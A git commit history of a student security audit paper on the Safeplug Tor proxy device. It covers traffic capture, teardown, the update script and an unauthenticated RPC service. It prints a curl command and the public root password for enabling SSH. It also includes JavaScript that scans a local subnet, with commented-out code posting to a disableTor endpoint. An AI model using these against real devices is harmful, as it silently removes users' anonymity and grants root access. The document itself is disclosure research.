+\label{fig:proxyconfig}
+\end{center}
+\end{figure}
+
+After we finished our configuration, we were taken to our settings.
+This page is shown in Figure~\ref{fig:settings}.
+This allowed us to turn on/off Tor, add whitelisted websites, turn on/off ad-blocking, and turn on/off the ability of our device to be a relay node.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\textwidth]{settings}
+\caption{This is a figure.}
+\label{fig:settings}
+\end{center}
+\end{figure}
+
+{\bf Using the Internet.} Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
+Both of these figures show our IP address in the top right corner; due to the change in IP address we can see that our traffic is being routed through Tor.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=0.5\textwidth]{before}
+\caption{This is a figure.}
+\label{fig:before}
+\end{center}
+\end{figure}
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=0.5\textwidth]{after}
+\caption{This is a figure.}
+\label{fig:after}
+\end{center}
+\end{figure}
+
+Next, we wanted to see how usable this would be to a normal Internet user.
+A user would probably decide not to use Safeplug if they couldn't read their web pages (if they weren't in their native language), or if they couldn't log into their accounts (some web sites will lock a user out if they try to login from multiple countries in a short time period).
+While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, then they may just get frustrated and stop using Safeplug altogether.
+We were also prompted with the page in Figure~\ref{fig:funnygoogle} when we tried to log into our Google account.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=0.5\textwidth]{funnygoogle}
+\caption{This is a figure.}
+\label{fig:funnygoogle}
+\end{center}
+\end{figure}
+
+{\bf Cookies.}  While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ logo in a different tab.
+When we clicked on the Google+ logo, it remember who we are; so we can confirm that we still have first-party cookies.
+We experienced the same situation with Facebook and its corresponding ``like'' button.
 
@@
 \end{figure}
-
-\subsubsection{Possible Attacks}
-    -Possible attacks via USB/SD Card

### 2014-01-14 bibliography.tex
added results
Most of the resultsSoftware section

--- 2014-01-14 bibliography.tex
@@
 ``Touching from a distance: Website fingerprinting attacks and defenses.'' \emph{Proceedings of the 2012 ACM conference on Computer and Communications Security (CCS)}, 2012.
+
+\bibitem{ceadmin} Colleton, Lee. ``Fwd: SSH on Safeplug'' \emph{Tor-talk mailing list} 2 January 2014. \url{http://archives.seul.org/or/talk/Jan-2014/msg00003.html}
 
@@
 
+\bibitem{tormailinglist} Tor Mailing List.  \url{https://lists.torproject.org/pipermail/tor-talk/2013-November/031199.html}.
+
 \bibitem{wireshark} Wireshark, \url{http://www.wireshark.org/}.

### 2014-01-14 results.tex
Most of the resultsSoftware section

@@
 \subsubsection{Terms of Service}
+\label{tos}
 Safeplug's Terms of Service are interesting because they are controlling, yet the product they are for is a device for anonymization.
@@
 The link included is a dead link and takes the user to a web page with a 404 error.
-This may indicate that there are other errors related to Safeplug (potential security vulnerabilities).
+This lack of attention to detail or respect for open source licenses does not put Pogoplug in a good light.
+In fact, the Tor mailing list noted this particularly, since Tor is an open source project \cite{tormailinglist}.
 The last section of the Terms of Service that stood out described Pogoplug's policy on updates:
@@
 \subsubsection{Internet Use}
-
+\label{inetuse}
 {\bf Setting up Safeplug.} The first step was to plug Safeplug into our router and activate our device.

### 2014-01-14 resultsSoftware.tex
Most of the resultsSoftware section

@@
 \label{sec:traffic}
-TODO: Anna
-    -What's the udpate?
-    -Phone home frequency
-    -Does it do anything else?
-    -How does the ad-blocking work?
+
+\subsubsection{Initial Plugin Behavior}
+Before allowing the Safeplug box to be connected to the outside world, we attached it to the home connection setup described in Section \ref{sec:proc} and captured traffic for a few minutes on the local network.
+From visual inspection (Figure \ref{redlight}), there was certainly something trying to access the internet and displaying an error on its failure.
+
+\begin{figure}[htb]
+        \centering
+        \begin{subfigure}[b]{0.3\textwidth}
+                \includegraphics[width=\textwidth]{redlight.jpg}
+                \caption{Safeplug box when only connected to the local network.}
+                \label{redlight}
+        \end{subfigure}%
+        \quad %add desired spacing between images, e. g. ~, \quad, \qquad etc.
+          %(or a blank line to force the subfigure onto a new line)
+        \begin{subfigure}[b]{0.4\textwidth}
+          \centering
+          \includegraphics[width=.66\textwidth,angle=180]{greenlight.jpg}
+                \caption{Safeplug box after connection to the internet, regardless of whether Tor was enabled.}
+                \label{greenlight}
+        \end{subfigure}
+        \caption{Safeplug box during initial setup prior to an internet connection and after activation from the Pogoplug website.}
+        \label{fig:lights}
+\end{figure}
+
+Analysis of the TCP dump showed that the Safeplug box repeatedly queried the local DNS server for two items: \url{pogoplug.com} and the NIST standardized time.
+The first query for the time was to \url{www.nist.gov}, and subsequent queries included \url{nist1-chi.ustiming.org}, \url{nist1-ny.ustiming.org}, \url{time-nw.nist.gov}, and \url{nist1.symmetricom.com}.
+Queries about pogoplug were mostly for \url{service.pogoplug.com} but after that set was tried \url{secure.pogoplug.com} was attempted once.
+While it was only connected to the local network, we also did a scan of all the ports of the Safeplug and only port 80 was open.
+
+\subsubsection{Activation and Update Traffic}
+\label{updatetraf}
+After establishing the initial update behavior, we connected the other end of our homemade router back to the internet and captured traffic on both the network interfaces.
+As we had seen previously, the first effort of the Safeplug was to query for \url{service.pogoplug.com} and connect, and the send a POST/XML request to that server containing a 16 byte numerical string of type \verb!nid!, \verb!0x0!
+as \verb!flags!, and a field called \verb!pingdata!
+with length of 423 bytes and undiscernable contents.
+In future work, we hope to explore the contents of this automatic connection with the Pogoplug servers to discover what information is being passed along.
+
+The client computer then navigated to the Pogoplug website to complete the activation processes.
+Each step of the process resulted in both TCP and UDP traffic between the Safeplug box and the pogoplug servers.
+Most interesting was the update step in which the Safeplug box knew to request a script from \url{<update server IP>/svc/upgrade/safeplug\_switch.sh}.
+Since this operation occured over normal HTTP, we were able to use \verb!curl!
+to recover the same script and examine it to discover the contents of the upgrade.
+
+The upgrade script shows (and the network traffic confirms) that the box downloads and installs the following \verb!.tgz! files: 
+\begin{fileName}
+safeplug_lighttpd, safeplug_lighttpd_config, safeplug_wget, safeplug_certs, safeplug_gohelper, safeplug_tor, safeplug_tor_config, safeplug_privoxy, safeplug_privoxy_config
+\end{fileName}
+  Each file is compared to an MD5 hash before being unzipped and installed.
+Details about the software found on the Safeplug are discussed in Section \ref{software}.
+After the two lighttpd installations, a process called \verb!hbplug!
+is killed and lighttpd is started.
+After the certs are downloaded, the current \verb!/usr/local/ssl!
+is overwritten with the new certs.
+The \verb!go\_helper!
+is added to the \verb!/opt/xce/sbin!
+folder, and contains binary files with names related to update and upgrade (which we hope to decompile in future work).
+
+After completing the installations, a default Safeplug configuation file is written with use of Tor set to 1.
+(More information about the configuration in Section \ref{spconfig}.)  Finally, the old \verb!rcS!
+file in \verb!/etc/init.d!
+is replaced with commands to start lighttpd, tor and privoxy, and the LED is set to green as shown in Figure \ref{greenlight} after the completion of the upgrade.
+This means that the green LED indicates an up-to-date, internet-connected Safeplug, rather than anything about the use of TOR.
+
+\subsubsection{Traffic After Activation}
+After the activation and the configuration of the Safeplug as a proxy, all traffic was through the Tor network.
+The Safeplug connected to a directory to learn about different relays and seemed to cycle through a small set around the world for different connections.
+This demonstrates that Tor is working as expected.
+If there is any ``phone-home'' being done by the device after Tor has been turned on, then it is doing so through the Tor network.
 
@@
 \label{sec:SSH}
-TODO: Anna
-    -How we got access
     \subsubsection{Accessing the Device}
-    -What's the software
+    Safeplug runs an RPC server that allows the enabling of SSH access via HTTP.
+SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
+\begin{fileName}
+curl --data ``'' http://<IP-of-Safeplug>/svc/xspctrl/enableSSHD
+ssh root@<IP-of-Safeplug>
+password: ceadmin
+\end{fileName}
+
+Obviously having a publically available root password means that SSH can be done effectively without authentication.
+We tried the SSH procedure twice, once before the internet connection and activation, and once afterwards.
+Before the activation and update procedure, SSH was not available.
+The simple \verb!Hbplug!
+software on the box could not accept this RPC call.
+However, once the box was updated and had lighttpd installed, the SSH procedure was available and we could download the contents of the root filesystem for analysis.
+
     \subsubsection{Software on the Safeplug}
-Tor, Privoxy, and Lighttpd.
+\label{software}
+As would be suspected from the analysis of the update script described above in Section \ref{updatetraf}, the installed software is in \verb!/opt/xce!
+and includes lighttpd, privoxy, and tor.
 Lighttpd is an open-source webserver, which is serving the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
@@
 Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removnig ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
-    -What/where are the settings
-    -RPC server
-        -Attacks from anyone on local network
-        -Attack from a website?
+Privoxy is also open source.
+All three pieces of software appear to be there with default configuration files (with all appropriate citations and comments present).
+The Safeplug uses its own configuration files to determine how these pieces of software are set up and used.
+
+    \subsubsection{Configuration on the Safeplug}
+\label{spconfig}
+
+\subsection{Attacking the RPC Server}
+
+\subsubsection{Insider Attack}
+Since the RPC server does not perform any kind of validation or authentication on the settings strings, it would be easy for anyone inside the local network to send a command and change the settings, for example to disable Tor or adblocking.
+All the attacker would need to know is the IP of the device.
+It does not even require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
+
+This attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
+The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.
+It is easy to imagine any malicious party, not just one with the resources of a government, (although governments might be some of the most interested parties in attacking a Tor proxy) compromising the gateway and using that access make a disabling RPC call into the Safeplug.
+This would occur silently from the perspective of a client unless the happen to check the Settings page for the Safeplug.
+Instead, the client would continue browsing with a belief that they are protected by their use of the Tor network, while in fact any external adversary can track their traffic.
+
+This seems like a fairly important vulnerability and requires action from Pogoplug to fix.
+Since the purpose of these RPC operations is unclear without access to more of the source code, it is possible that they could be disabled entirely.
+If not, perhaps there is some authentication protocol that could be implemented.
+The challenge of such a protocol from a user's point of view is that valid access would be infrequent so giving a user a password to remember would be a poor experience.
+
+\subsubsection{Website Attack}
+We think it is also possible that an external website could perform this attack by returning the correctly formatted POST string.

### 2014-01-14 results.tex
merge

--- 2014-01-14 results.tex
@@
 \label{sec:tear}
-
-\subsubsection{Components}
-    -Parts in the box
+We opened up the Safeplug device to look at the internals.
+Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.
+We identified an SD card slot, Lan transformer, and Ethernet transceiver on the top of the board.
+On the bottom, we found flash memory and the integrated circuit.
 
@@
 \caption{This is a figure.}
+\label{fig:top}
 \end{center}
@@
 \caption{This is a figure.}
+\label{fig:bottom}
 \end{center}

### 2014-01-14 procedure.tex

@@
 \section{Procedure}
-\label{sec:procedure}
+\label{sec:proc}
 TODO: Anna
@@
 We are interested both in the communication between the clients and the Safeplug and between the Safeplug and the outside world.
+
+We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}.

### 2014-01-14 procedure.tex
proc

--- 2014-01-13 procedure.tex
@@
 \section{Procedure}
-\label{sec:procedure}
-TODO: Anna
-Safeplug is not open source, which makes a security audit much more challenging.
-This leads to a debate on where a user will put his/her trust.
-Despite not having the source code, we hope to get a Safeplug, set it up via their website, and use Wireshark to capture traffic and see what happens.
-Wireshark allows us to capture and analyze network data \cite{wireshark}.
+\label{sec:proc}
+Although Safeplug uses open source components (not that they are properly documented, as we discovered in Section \ref{tos} below), the device itself is not open source, which makes a security audit much more challenging.
+We approached this audit both from the perspective of a user (see Section \ref{sec:ux}) and the perspective of a security researcher (Section \ref{sec:tear} - \ref{sec:SSH}).
+This included a teardown of one of the boxes to identify components, capturing network traffic, and accessing the box via SSH.
+
+We set up a mock ``home network'' such as the device might be expected to see and then capture traffic both inside that network and between the network and the internet.
+We did this by using a computer with two network cards.
+One card was connected to a Netgear switch and served as a gateway, DHCP server, and DNS server.
+The other card was the connection to the internet.
+Setting up the various components, as well as a bridge and IP forwarding across the two network cards was a particularly time-consuming endeavour, but it allowed us to capture Safeplug traffic as it might occur in the wild.
+We used Wireshark to analyze the network data that we captured \cite{wireshark}.
 We are interested both in the communication between the clients and the Safeplug and between the Safeplug and the outside world.
+
+We expected the SSH component of the project to be a challenge, but thanks to Pogoplug's lack of security, the instructions and root password were available online!
+We analyzed the filesystem on the Safeplug discovered an RPC server that was subject to attack from insiders and potentially from external threats as well.

### 2014-01-14 report.tex
modified the paper to include sections
margins
paper additions
Most of the resultsSoftware section
proc

--- 2014-01-02 report.tex
@@
 \documentclass[12pt, letterpaper]{article}
+\usepackage[hyphens]{url}
+\usepackage{breakurl}
+\usepackage[pdftex]{graphicx}
+\usepackage[left=1in,top=1in,right=1in,bottom=1in,head=.5in,foot=.5in]{geometry}
+\usepackage{setspace}
+
+%\usepackage{caption}
+\usepackage{subcaption}
+%\usepackage[small,compact]{titlesec}
+\usepackage{listings}
+\lstnewenvironment{fileName}{%
+\lstset{%
+        basicstyle=\ttfamily,
+        breaklines,
+    }%
+}{%
+}
 
@@
 
+\input{intro}
+\input{goals}
+\input{procedure}
+\input{results}
+\input{resultsSoftware}
+\input{related}
+\input{conclusion}
+
+\section{Acknowledgements}
+We would like to express our gratitude to Josh Kroll for donating a lot of time and his computer to the routing effort.  We also thank whoever left the very nice set of screwdrivers on our desks!
+
+This paper represents our own work in accordance with University regulations.
+
+Anna Kornfeld Simpson and Annie Edmunson
+
 \input{bibliography}

### 2014-01-14 results.tex
smaller figures
proc

@@
 
-\begin{figure}[htb]
+\begin{figure}[th]
 \begin{center}
@@
 
-\begin{figure}[htb]
+\begin{figure}[t]
 \begin{center}
-\includegraphics[width=\textwidth]{instructions}
+\includegraphics[width=.75\textwidth]{instructions}
 \caption{This is a figure.}
@@
 
-\begin{figure}[htb]
+\begin{figure}[t]
 \begin{center}
-\includegraphics[width=\textwidth]{proxyconfig}
+\includegraphics[width=.75\textwidth]{proxyconfig}
 \caption{This is a figure.}
@@
 \begin{center}
-\includegraphics[width=\textwidth]{settings}
+\includegraphics[width=.75\textwidth]{settings}
 \caption{This is a figure.}
@@
 \begin{figure}[htb]
-\begin{center}
-\includegraphics[width=0.5\textwidth]{before}
+\centering
+\begin{subfigure}[b]{.4\textwidth}
+\includegraphics[width=\textwidth]{before}
 \caption{This is a figure.}
 \label{fig:before}
-\end{center}
-\end{figure}
-
-\begin{figure}[htb]
-\begin{center}
-\includegraphics[width=0.5\textwidth]{after}
+\end{subfigure}%
+\quad
+\begin{subfigure}[b]{.4\textwidth}
+\includegraphics[width=\textwidth]{after}
 \caption{This is a figure.}
 \label{fig:after}
-\end{center}
+\end{subfigure}
 \end{figure}
@@
 
+This is clearly not the perfect ``anonymity'' that Safeplug promised in their publicity.
+Although normal use does follow this model of persisting logins across browser tabs and sessions, a user concerned about anonymity and seeing each session coming up differently (German vs Swedish) might mistakenly believe that they do not have to log out of their social media accounts to preserve their anonymity when accessing other websites.
+
+More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.
+It requires a trip to the browser settings to clear cookies (or not have them set in the first place).
+We used the FourthParty plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data during the client's use of the Safeplug \cite{fourthparty}, and future work will include an analysis of this data, particularly looking for third-party cookies.
+
 \subsection{Teardown}
@@
 \begin{figure}[htb]
-\begin{center}
-\includegraphics[width=0.25\textwidth]{safeplug_top}
+\centering
+\begin{subfigure}[b]{.3\textwidth}
+  \includegraphics[width=\textwidth]{safeplug_top}
   \caption{This is a figure.}
   \label{fig:top}
-\end{center}
-\end{figure}
-
-\begin{figure}[htb]
-\begin{center}
-\includegraphics[width=0.25\textwidth]{safeplug_bottom}
+\end{subfigure}%
+\qquad
+\begin{subfigure}[b]{.3\textwidth}
+\includegraphics[width=\textwidth]{safeplug_bottom}
 \caption{This is a figure.}
 \label{fig:bottom}
-\end{center}
+\end{subfigure}
+\caption{Safeplug circuit board after the teardown.}
 \end{figure}

### 2014-01-14 resultsSoftware.tex
results

@@
     Safeplug runs an RPC server that allows the enabling of SSH access via HTTP.
-SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
+SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same (although the Pogoplug support staff note that SSH access breaks the warranty!) \cite{ceadmin}:
 \begin{fileName}
@@
     \label{spconfig}
+The Safeplug configuration files can be found in \verb!/opt/xce/etc!
+and include \verb!sp.conf!
+and \verb!sp_version!
+and \verb!sp_torexceptions!.
+The first contains all of the important details from the configuration page (whether to use Tor, whether to be a relay, whether to adblock) as well as a hidden option about whether to be an exitrelay for the Tor network.
+This is not documented anywhere on the site, so enabling this option would likely require SSH access to discover it, thereby breaking the warranty, but it is interesting that this option is available.
+The version file is likely used for updates, and the exceptions file is used by the privoxy configuation to control the whitelist of sites not to connect to via Tor.
 
-\subsection{Attacking the RPC Server}
+These configuration files are read by the scripts in \verb!/opt/xce/etc/init.d!
+which enable lighttpd, privoxy, and tor.
+As expected, Privoxy looks at the Tor, adblock and exceptions configurations, and Tor reads the \verb!sp.conf!
+file to set which Tor configuration file (regular, relay or exitrelay) to use.
+
+\subsection{Attacking the RPC Capability}
+As we discovered while enabling SSH, the Safeplug has a remote procedure call (RPC) capability.
+This is a script called \verb!xspctrl!
+found in \verb!/opt/xce/html/svc!
+and it contains more options than just SSH enabling.
+Particularly, functional calls to this script include enable and disable for all of the Safeplug settings, including Tor, ad block, and Tor relay.
+None of them require any arguments in the POST string.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=.75\textwidth]{disabletor}
+\caption{Disabling Tor as an insider attack.}
+\label{disable}
+\end{center}
+\end{figure}
 
@@
 It does not even require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
+Figure \ref{disable} shows an example of this attack.
 
@@
 \subsubsection{Website Attack}
-We think it is also possible that an external website could perform this attack by returning the correctly formatted POST string.
+We think it is also possible that an external website could perform this attack by returning the correctly formatted POST string.  Setting this up is future work.

### 2014-01-14 intro.tex
edited captions

@@
 \label{sec:intro}
-    -Motivation
-    -Tor
-    -Safeplug
-Safeplug is a product that launched last week from the cloud storage company Pogoplug, offering to let users browse the web with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
+
+User privacy is becoming increasingly important as more Internet users realize how vulnerable they are to attackers and eavesdroppers.
+This has been exacerbated by the current news about the NSA's surveillance of the Internet~\cite{nsa}.
+Unfortunately, the average Internet user is not aware of how to protect themselves against malicious users.
+
+{\bf Tor.} Among the more computer-savvy Internet users, Tor is gaining popularity for this reason.
+Tor is a service that provides anonymous communication as an onion router; it also makes a tradeoff between anonymity, usability, and efficiency~\cite{tor}.
+While Tor provides some measure of anonymity, the average Internet user does not know about it or how it works.
+
+{\bf Safeplug.} Safeplug is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor without having to know about it or how it works.
+It allows users to browse the web with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
 Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user’s router and the internet \cite{wired}.
 Pogoplug’s marketing pitch centers around the protection of user’s IP addresses by using Tor \cite{safeplug,bittech}.
-Lots of folks are excited about the idea, but waiting to see a security audit, including Bruce Schneier \cite{schneier}.
-Gigaom quotes Pogoplug CEO Dan Putterman as saying the box uses “vetted software” \cite{gigaom} but who knows what that means?

### 2014-01-14 results.tex
edited captions

@@
 \includegraphics[width=\textwidth]{funnydesc.png}
-\caption{This is a figure.}
+\caption{Description of Tor on Safeplug settings page.}
 \label{fig:funnydesc}
@@
 \includegraphics[width=\textwidth]{relaydesc.png}
-\caption{This is a figure.}
+\caption{Description of a Tor relay on Safeplug settings page.}
 \label{fig:relaydesc}
@@
 \includegraphics[width=.75\textwidth]{instructions}
-\caption{This is a figure.}
+\caption{Configuration instructions.}
 \label{fig:instructions}
@@
 \includegraphics[width=.75\textwidth]{proxyconfig}
-\caption{This is a figure.}
+\caption{Proxy Configuration.}
 \label{fig:proxyconfig}
@@
 \includegraphics[width=.75\textwidth]{settings}
-\caption{This is a figure.}
+\caption{Settings page.}
 \label{fig:settings}
@@
 \includegraphics[width=\textwidth]{before}
-\caption{This is a figure.}
+\caption{Web page before using Tor and ad-blocking.}
 \label{fig:before}
@@
 \includegraphics[width=\textwidth]{after}
-\caption{This is a figure.}
+\caption{Web page after using Tor and ad-blocking.}
 \label{fig:after}
@@
 \includegraphics[width=0.5\textwidth]{funnygoogle}
-\caption{This is a figure.}
+\caption{Google's response after trying to log in.}
 \label{fig:funnygoogle}
@@
   \includegraphics[width=\textwidth]{safeplug_top}
-  \caption{This is a figure.}
+  \caption{Top of the board inside the Safeplug device.}
   \label{fig:top}
@@
 \includegraphics[width=\textwidth]{safeplug_bottom}
-\caption{This is a figure.}
+\caption{Bottom of the board inside the Safeplug device.}
 \label{fig:bottom}

### 2014-01-14 related.tex
modified the paper to include sections
paper additions

--- 2014-01-02 report.tex
@@
-\documentclass[12pt, letterpaper]{article}
+\section{Related Work}
+\label{sec:related}
 
-\title{Security Audit of Safeplug}
-\author{Annie Edmundson and Anna Kornfeld Simpson}
+{\bf Tor.} There has been previous research analyzing Tor and evaluating Tor's security against realistic adversaries~\cite{tor2}.
+Specifically, research has shown that it is possible to deanonymize users that use Tor.
+Safeplug does not modify Tor, it simply uses it.
+Despite warnings on the Tor project website that state no other configurations are guaranteed to make a user anonymous, except for the Tor Browser Bundle~\cite{torproject}.
 
-\begin{document}
+{\bf Fingerprinting.}  Prior research has shown privacy attacks based on fingerprinting physical devices as well as through traffic analysis~\cite{fingerprint1, fingerprint2}.
+We used Panopticlick to determine how unique our browser fingerprint is, and it was determined to be unique, despite Safeplug's anonymity guarantees~\cite{pano}.
 
-\maketitle
-
-\input{bibliography}
-
-\end{document}
+{\bf Third-party and Supercookies.} Cookies and web tracking have been popular research areas lately.  Some related work regards user privacy leaks based on cookies~\cite{commercial1, commercial2}.

### 2014-01-23 public_html/index.js
disable site

@@ -1,0 +1,86 @@
+function go() {
+
+   //for (var j = 0; j <= 255; j++)
+   //{
+      //var tryip = "http://192.168.0." + j;
+      var req = new XMLHttpRequest();
+      //var tryip = "http://www.princeton.edu/main/";
+      //var tryip = "54.197.241.92";
+      var tryip = "http://www.google.com/";
+//var tryip = "http://192.168.0.4";
+      
+      function newcallb() {
+         var rs = req.readyState;
+         if (rs > 1)
+            console.log("googleback");
+      }
+
+      function handlereadychange(myip) { 
+         console.log("HERE");
+         console.log(myip);
+         //document.write("My ip: " + myip + "\n<br>");
+         //document.write("State changed.\n<br>");
+         var rs = req.readyState;
+         console.log("State is: " + rs);
+         console.log(req);
+         if (rs != 4) {
+             return;
+         }
+         console.log("Done");
+         if (req.status == 404) {
+            console.log("404\n");
+            return;
+         }
+         console.log("Probably a thing.");
+          //document.write("Finding the IP address.\n<br>");
+          //delete req['onreadystatechange'];
+         /*var respo = req.responseText;
+         var hostinfo = respo.split("http://");
+         //document.write(hostinfo);
+         var ip = "0.0.0.0";
+         for (var i = 0; hostinfo.length >= i; i++) {
+            var ipend = hostinfo[i].search("/wpad");
+            if (ipend != -1)
+            {
+               ip = hostinfo[i].substring(0, ipend);
+               break;
+            }
+         }
+         if (ip == "0.0.0.0") {
+            document.write("Error finding ip!\n<br>");
+            return;
+         }
+         */
+         //     document.write("IP found: " + ip + "\n<br>");
+         var secondreq = new XMLHttpRequest();
+         //document.write("Stuff\n<br>");
+         try{
+         secondreq.open("GET", "http://www.yahoo.com", true);
+         secondreq.onreadystatechange = newcallb;
+         secondreq.send();
+         }
+         catch(error)
+         {
+            document.write("google failed");
+         }
+//var postreq = new XMLHttpRequest();
+         //postreq.open("POST", "http://" + ip + "/svc/xspctrl/disableTor", true);
+         //postreq.send();
+
+      }
+      
+      try {
+         console.log("hi");
+         req.open("GET", tryip, true);
+         req.onreadystatechange = _.partial(handlereadychange, tryip);
[…]

### 2014-01-23 public_html/nonfunctionalajax.js

@@ -1,0 +1,30 @@
+var complete = function(ip, jqXHR) {
+   console.log("success");
+   console.log(ip);
+   console.log(jqXHR);
+};
+
+$(function() {
+    var tryip = "http://54.197.241.93";
+    // var tryip = "http://www.princeton.edu/main/";
+    // var tryip = "hello.html";
+    var req = $.ajax({
+         type: "GET",
+         crossDomain: true,
+         url: tryip,
+         timeout: 10000
+    }).complete(_.partial(complete, tryip));
+
+/*
+    req.done(function(data, textStatus, jqXHR) {
+       console.log('were here');
+    }).error(function(a,b,c) {
+       console.log('error');
+       console.log(a);
+       console.log(b);
+       console.log(c);
+    });
+*/
+    console.log("hi");
+    console.log(req);
+});

### 2014-01-23 nat-fw.sh
Updated website and some interesting things from the filesystem.

@@ -1,0 +1,315 @@
+#!/bin/sh
+#
+#firewall-iptables
+FWVER= 0.76
+#
+#               Initial SIMPLE IP Masquerade test for 2.6 / 2.4 kernels
+#               using IPTABLES.
+#
+#               Once IP Masquerading has been tested, with this simple
+#               ruleset, it is highly recommended to use a stronger
+#               IPTABLES ruleset either given later in this HOWTO or
+#               from another reputable resource.
+#
+#
+#
+# Log:
+#       0.76 - Added comments on why the default policy is ACCEPT
+#       0.75 - Added more kernel modules to the comments section 
+#       0.74 - the ruleset now uses modprobe vs. insmod
+#       0.73 - REJECT is not a legal policy yet; back to DROP
+#       0.72 - Changed the default block behavior to REJECT not DROP
+#       0.71 - Added clarification that PPPoE users need to use 
+#              "ppp0" instead of "eth0" for their external interface
+#       0.70 - Added commented option for IRC nat module
+#            - Added additional use of environment variables
+#            - Added additional formatting 
+#       0.63 - Added support for the IRC IPTABLES module
+#       0.62 - Fixed a typo on the MASQ enable line that used eth0
+#              instead of $EXTIF
+#       0.61 - Changed the firewall to use variables for the internal 
+#              and external interfaces.
+#       0.60 - 0.50 had a mistake where the ruleset had a rule to DROP
+#              all forwarded packets but it didn't have a rule to ACCEPT
+#              any packets to be forwarded either
+#            - Load the ip_nat_ftp and ip_conntrack_ftp modules by default
+#       0.50 - Initial draft
+#
+
+echo -e "\n\nLoading simple rc.firewall-iptables version $FWVER..\n"
+
+
+# The location of the iptables and kernel module programs 
+#
+#   If your Linux distribution came with a copy of iptables,
+#   most likely all the programs will be located in /sbin.  If
+#   you manually compiled iptables, the default location will
+#   be in /usr/local/sbin 
+#
+# ** Please use the "whereis iptables" command to figure out
+# ** where your copy is and change the path below to reflect
+# ** your setup
+#
+IPTABLES=/sbin/iptables
+#IPTABLES=/usr/local/sbin/iptables 
+DEPMOD=/sbin/depmod
+MODPROBE=/sbin/modprobe
+
+
[…]

### 2014-01-23 nat.sh

@@ -1,0 +1,52 @@
+echo -e "\n\nLoading simple rc.firewall-iptables version $FWVER..\n"
+DEPMOD=/sbin/depmod
+MODPROBE=/sbin/modprobe
+
+EXTIF="eth0"
+INTIF="eth1"
+#INTIF2="eth0"
+echo "   External Interface:  $EXTIF"
+echo "   Internal Interface:  $INTIF"
+
+#======================================================================
+#== No editing beyond this line is required for initial MASQ testing == 
+echo -en "   loading modules: "
+echo "  - Verifying that all kernel modules are ok"
+$DEPMOD -a
+echo "----------------------------------------------------------------------"
+echo -en "ip_tables, "
+$MODPROBE ip_tables
+echo -en "nf_conntrack, " 
+$MODPROBE nf_conntrack
+echo -en "nf_conntrack_ftp, " 
+$MODPROBE nf_conntrack_ftp
+echo -en "nf_conntrack_irc, " 
+$MODPROBE nf_conntrack_irc
+echo -en "iptable_nat, "
+$MODPROBE iptable_nat
+echo -en "nf_nat_ftp, "
+$MODPROBE nf_nat_ftp
+echo "----------------------------------------------------------------------"
+echo -e "   Done loading modules.\n"
+echo "   Enabling forwarding.."
+echo "1" > /proc/sys/net/ipv4/ip_forward
+echo "   Enabling DynamicAddr.."
+echo "1" > /proc/sys/net/ipv4/ip_dynaddr 
+echo "   Clearing any existing rules and setting default policy.."
+
+iptables-restore <<EOF
+-EOF
+*nat
+-A POSTROUTING -o "$EXTIF" -j MASQUERADE
+COMMIT
+*filter
+:INPUT ACCEPT [0:0]
+:FORWARD DROP [0:0]
+:OUTPUT ACCEPT [0:0]
+-A FORWARD -i "$EXTIF" -o "$INTIF" -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 
+-A FORWARD -i "$INTIF" -o "$EXTIF" -j ACCEPT
+-A FORWARD -j LOG
+COMMIT
+EOF
+
+echo -e "\nrc.firewall-iptables v$FWVER done.\n"

### 2014-01-23 public_html/index.js

@@ -1,86 +1,52 @@
-function go() {
-
-   //for (var j = 0; j <= 255; j++)
-   //{
-      //var tryip = "http://192.168.0." + j;
+function go() { 
+   for (var j = 0; j <= 10; j++)
+   {
+      var tryip = "http://192.168.0." + j;
       var req = new XMLHttpRequest();
-      //var tryip = "http://www.princeton.edu/main/";
-      //var tryip = "54.197.241.92";
-      var tryip = "http://www.google.com/";
-//var tryip = "http://192.168.0.4";
-      
-      function newcallb() {
-         var rs = req.readyState;
-         if (rs > 1)
-            console.log("googleback");
-      }
+      //var tryip = "http://192.168.0.4";
 
+      function postback() {
+         console.log("Postback ");
+      }
+      function handletimeout(myip) {
+         console.log(myip + " timed out.");
+      }
+      
       function handlereadychange(myip) { 
-         console.log("HERE");
-         console.log(myip);
-         //document.write("My ip: " + myip + "\n<br>");
-         //document.write("State changed.\n<br>");
          var rs = req.readyState;
-         console.log("State is: " + rs);
-         console.log(req);
+         //console.log("State is: " + rs);
+         // console.log(req);
+         console.log(myip + " " + rs);
          if (rs != 4) {
-             return;
+            return;
          }
-         console.log("Done");
+         console.log("Done " + myip);
          if (req.status == 404) {
             console.log("404\n");
             return;
          }
